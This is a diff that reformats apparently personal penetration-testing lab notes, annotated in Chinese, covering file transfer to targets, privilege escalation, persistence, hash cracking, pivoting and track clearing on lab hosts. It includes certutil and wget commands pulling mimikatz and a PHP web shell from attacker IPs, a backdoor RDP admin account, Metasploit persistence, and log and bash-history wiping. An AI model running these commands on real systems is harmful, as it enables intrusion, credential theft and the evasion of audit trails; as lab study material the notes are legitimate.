@@ -1,11 +1,11 @@
-Transferring Files To Windows & Linux Targets 3
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Setting Up A Web Server With Python
+# Transferring Files To Windows & Linux Targets 3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	python -m SimpleHTTPServer 80
-	瀏覽器: http://ip
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Transferring Files To Windows Targets
+	Setting Up A Web Server With Python
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		python -m SimpleHTTPServer 80
+		瀏覽器: http://ip
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Transferring Files To Windows Targets
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	傳輸Kali Linux 系統上/usr/share/windows-resources/mimikatz/x64目錄下的 mimikatz.exe 執行檔: 
 	cd /usr/share/windows-resources/mimikatz/x64
@@ -17,8 +17,8 @@ Transferring Files To Windows Targets
 	cd Temp
 	shell
 	certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Transferring Files To Linux Targets
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Transferring Files To Linux Targets
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將傳輸Kali 機器上/usr/share/webshel​​ls/php/目錄下的php-backdoor.php檔案
 	cd /usr/share/webshells/php/
@@ -27,18 +27,17 @@ Transferring Files To Linux Targets
 	/bin/bash -i 
 	cd /tmp
 	wget http://192.217.117.2/php-backdoor.php
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Upgrading Shells : 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Upgrading Shells : 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	第一種技術涉及產生 bash 會話:
 	/bin/bash -i
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用 Python 產生 bash 會話:
 	python -c 'import pty; pty.spawn("/bin/bash")'
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Privilege Escalation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows：PrivescCheck
+	
+# Windows Privilege Escalation
+## Windows：PrivescCheck
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	cmd: powershell
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -74,8 +73,8 @@ Windows：PrivescCheck
 	cd C:\\Users\\Administrator\\Desktop
 	dir
 	cat flag.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Privilege Escalation 2
+	
+##  Linux Privilege Escalation 2
 	Permissions Matter!
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC target.ine.local
@@ -116,8 +115,8 @@ Linux Privilege Escalation 2
 	cd /root
 	ls -l
 	cat flag
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Editing Gone Wrong
+	
+## Editing Gone Wrong
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	尋找setuid程式方法開始
 	find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
@@ -133,9 +132,8 @@ Editing Gone Wrong
 	cd /root
 	ls -l
 	cat flag
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Persistence 
-Maintaining Access: Persistence Service
+# Windows Persistence 
+	Maintaining Access: Persistence Service
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	80/tcp    open  http               HttpFileServer httpd 2.3
@@ -175,8 +173,8 @@ Maintaining Access: Persistence Service
 	即使會話被殺死，我們也可以透過重新運行來再次獲得它
 	exit
 	msf6 exploit(multi/handler) > exploit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Maintaining Access: RDP
+	
+## Maintaining Access: RDP
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC  demo.ine.local
 	80/tcp  open  http          BadBlue httpd 2.7
@@ -202,9 +200,9 @@ Maintaining Access: RDP
 		將已建立的使用者新增至「遠端桌面使用者」和「管理員」群組
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Persistence 2
-Maintaining Access I
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Linux Persistence 2
+	Maintaining Access I
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -224,8 +222,8 @@ Maintaining Access I
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ls -l
 	cat flag.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-T1168: Local Job Scheduling
+	
+## T1168: Local Job Scheduling
 	=> e.g cron, launchd
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -p- demo.ine.local
@@ -250,9 +248,9 @@ T1168: Local Job Scheduling
 	<li><a href="flag.txt">flag.txt</a>
 
 	curl demo.ine.local:8000/flag.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Dumping & Cracking Windows Hashes
-Windows: NTLM Hash Cracking
+ 
+# Dumping & Cracking Windows Hashes
+## Windows: NTLM Hash Cracking
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 	80/tcp    open  http               BadBlue httpd 2.7
@@ -323,8 +321,7 @@ Windows: NTLM Hash Cracking
 	
 	顯示資料庫
 	\list
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Dumping & Cracking Linux Hashes -- Password Cracker: Linux
+## Dumping & Cracking Linux Hashes -- Password Cracker: Linux
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	/etc/init.d/postgresql start
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -335,20 +332,16 @@ Dumping & Cracking Linux Hashes -- Password Cracker: Linux
 	use auxiliary/analyze/crack_linux
 	set SHA512 true
 	run
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Pivoting Overview -- Pivoting
+# Pivoting Overview -- Pivoting
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	run autoroute -s 10.0.16.0/20
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-清除 Windows 事件日誌  (Event log)
+## 清除 Windows 事件日誌  (Event log)
 	Clearing Your Tracks On Windows : meterpreter : clearev
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-清除 Linux 上的痕跡
+## 清除 Linux 上的痕跡
 	Clearing Your Tracks On Linux: /bin/bash -i
 	所有活動都會以 bash 歷史記錄的形式記錄: 
 	=> history -c
 	刪除 .bash_history 檔案的內容來清除 bash 歷史記錄
 	=> cat /dev/null > ~/.bash_history
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
